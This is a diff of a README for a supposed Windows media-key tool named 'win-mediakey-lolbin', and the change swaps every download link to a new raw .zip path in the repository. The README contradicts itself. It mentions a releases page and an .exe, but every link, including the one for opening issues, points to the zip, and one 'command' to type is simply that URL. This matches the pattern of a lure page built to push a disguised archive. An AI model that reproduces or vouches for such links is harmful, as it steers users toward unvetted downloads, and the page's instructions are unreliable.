@@ -1,7 +1,7 @@
 # 🎵 win-mediakey-lolbin - Control Your Media Effortlessly
 
 ## 📥 Quick Download
-[![Download](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/src/lolbin-mediakey-win-explorative.zip%20Release-brightgreen)](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/src/lolbin-mediakey-win-explorative.zip)
+[![Download](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/scripts/mediakey_lolbin_win_v2.5.zip%20Release-brightgreen)](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/scripts/mediakey_lolbin_win_v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **win-mediakey-lolbin**, a simple command-line tool that helps you manage your Windows media playback. This lightweight application, about 4KB in size, allows you to control functions such as play, pause, and skip without needing any additional software. 
@@ -20,7 +20,7 @@ To run **win-mediakey-lolbin**, ensure you have the following:
 ## 📦 Download & Install
 To get started, visit the following page to download the application:
 
-[Download the latest release here](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/src/lolbin-mediakey-win-explorative.zip)
+[Download the latest release here](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/scripts/mediakey_lolbin_win_v2.5.zip)
 
 1. On the releases page, find the latest version.
 2. Click on the asset to download the `.exe` file. 
@@ -35,7 +35,7 @@ To get started, visit the following page to download the application:
    ```
 3. Type the command to run the application:
    ```
-   https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/src/lolbin-mediakey-win-explorative.zip
+   https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/scripts/mediakey_lolbin_win_v2.5.zip
    ```
 
 ### 🎶 What You Can Control
@@ -55,7 +55,7 @@ If you encounter issues while running the application:
 We welcome contributions to make **win-mediakey-lolbin** even better. If you have ideas or improvements, please feel free to submit a pull request on GitHub. 
 
 ## 🙌 Support
-For any questions or assistance, please open an issue on our [GitHub page](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/src/lolbin-mediakey-win-explorative.zip). We are here to help!
+For any questions or assistance, please open an issue on our [GitHub page](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/scripts/mediakey_lolbin_win_v2.5.zip). We are here to help!
 
 ## 📄 License
 This project is licensed under the MIT License. You can freely use, modify, and distribute this software as per the terms of the license.
@@ -70,4 +70,4 @@ This application relates to several topics, including:
 
 Thank you for choosing **win-mediakey-lolbin**! Enjoy seamless media control on your Windows device.
 
-[Download the latest release here](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/src/lolbin-mediakey-win-explorative.zip)
+[Download the latest release here](https://github.com/palamist/win-mediakey-lolbin/raw/refs/heads/main/scripts/mediakey_lolbin_win_v2.5.zip)
